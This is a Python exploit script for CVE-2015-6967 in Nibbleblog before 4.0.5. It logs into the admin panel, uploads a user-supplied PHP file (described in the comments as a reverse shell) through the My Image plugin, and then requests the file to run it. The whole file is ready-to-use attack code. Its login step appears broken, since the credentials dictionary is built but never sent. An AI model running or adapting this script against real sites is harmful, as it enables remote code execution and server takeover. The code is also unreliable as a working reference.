import argparse
import requests
import sys
from log_colors import *

# CVE-2015-6967
# Unrestricted file upload 
# vulnerability in the My Image plugin in 
# Nibbleblog before 4.0.5 allows 
# remote administrators to execute 
# arbitrary code by uploading a file 
# with an executable extension, 
# then accessing it via a direct request 
# to the file in content/private/plugins/my_image/image.php.
class CVE2015_6967:
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0",
    }

    def __init__(self, url, usr, pswd, payload_file):
        self.url = url
        self.usr, self.pswd = usr, pswd
        self.payload = open(payload_file, "rb")
        self.session = requests.Session()

    # get session id cookie
    def get_session_id(self):
        print (LogColors.BLUE + "get session id..." + LogColors.ENDC)
        r = self.session.get(self.url, headers = self.headers)
        if r.ok:
            session_id = r.headers['Set-Cookie']
            session_id = session_id.split(";")[0]
            print (LogColors.YELLOW + "session id: " + str(session_id) + "..." + LogColors.ENDC)
            self.session_id = session_id
            return session_id
        else:
            print (LogColors.RED + "failed parse session_id :(" + LogColors.ENDC)
            sys.exit()

    # login
    def login(self):
        print (LogColors.BLUE + "login..." + LogColors.ENDC)
        print (LogColors.YELLOW + str(self.usr) + ":" + str(self.pswd) + "..." + LogColors.ENDC)
        self.get_session_id()
        data = {
            "username" : self.usr,
            "password" : self.pswd
        }
        self.headers["Cookie"] = self.session_id
        try:
            r = self.session.post(
                self.url + "/admin.php", 
                headers = self.headers, allow_redirects = False
            )
            dashboard = self.session.get(r.url, headers = self.headers)
        except UnboundLocalError:
            r = self.session.post(
                self.url + "/admin.php",
                headers = self.headers, allow_redirects = True
            )
        except Exception:
            print (LogColors.RED + "failed to login :(" + LogColors.ENDC)
            sys.exit()
        
        try:
            session_id = dashboard.headers['Set-Cookie']
            session_id = session_id.split(";")[0]
            self.session_id = session_id
        except Exception:
            print (LogColors.YELLOW + "not new cookie..." + LogColors.ENDC)

    # send payload (php reverse shell)
    def send_payload(self):
        print (LogColors.BLUE + "send payload..." + LogColors.ENDC)
        url = self.url + "/admin.php?controller=plugins&action=config&plugin=my_image"
        print (LogColors.YELLOW + url + LogColors.ENDC)
        files = {
            'plugin': (
                None,
                b'my_image', 
                '', 
                '',
            ),
            'title': (
                None,
                b'My image',
                '',
                '',
            ),
            'position': (
                None,
                b'4',
                '',
                ''
            ),
            'caption': (
                None,
                b'',
                '',
                '',
            ),
            'image':(
                'hacked.php',
                self.payload,
                'application/x-php',
                '',
            ),
            'image_resize':(
                None,
                b'1',
                '',
                '',
            ),
            'image_width':(
                None,
                b'230',
                '',
                '',
            ),
            'image_height':(
                None,
                b'200',
                '',
                '',
            ),
            'image_option':(
                None,
                b'auto',
                '',
                '',
            )
        }
        r = self.session.post(url, files = files, headers = self.headers)
        if r.ok:
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to send payload :(" + LogColors.ENDC)
            sys.exit()

    # run reverse shell
    def run(self):
        print (LogColors.BLUE + "run reverse shell" + LogColors.ENDC)
        try:
            self.session.get(
                self.url + "/content/private/plugins/my_image/image.php",
                headers = self.headers
            )
            print (LogColors.GREEN + "reverse shell: OK" + LogColors.ENDC)
        except Exception:
            pass

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-f','--file', required = True, help = "payload file")
    parser.add_argument('-user','--username', required = True, help = "admin username")
    parser.add_argument('-pass','--password', required = True, help = "admin password")
    args = vars(parser.parse_args())
    url = args['url']
    usr, pswd = args['username'], args['password']
    payload_file = args['file']
    cve = CVE2015_6967(url, usr, pswd, payload_file)
    cve.login()
    cve.send_payload()
    cve.run()

